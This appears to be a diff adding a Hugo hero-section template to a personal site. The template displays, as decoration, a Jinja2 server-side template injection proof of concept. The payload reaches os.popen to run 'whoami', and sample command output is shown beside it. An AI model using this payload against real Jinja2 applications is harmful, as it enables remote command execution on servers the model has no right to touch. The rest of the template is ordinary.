@@ -1,0 +1,15 @@
+<p class="hero-intro">Hello, I'm</p>
+<h1>{{ .Site.Params.author }}</h1>
+
+<div class="ssti-proof" aria-label="SSTI proof of concept">
+  <strong>Jinja2 SSTI</strong>
+  <code>$ {{ "{{" }}7*'7'{{ "}}" }}-{{ "{{" }} namespace.__init__.__globals__.os.popen('whoami').read() {{ "}}" }}</code>
+  <span>Command output</span>
+  <code>$ 7777777-Afrode</code>
+</div>
+
+{{ if reflect.IsSlice .Site.Params.info }}
+<h2>{{ range .Site.Params.info }}{{ . | markdownify }}<br>{{ end}}</h2>
+{{ else }}
+<h2>{{ .Site.Params.info | markdownify }}</h2>
+{{ end }}
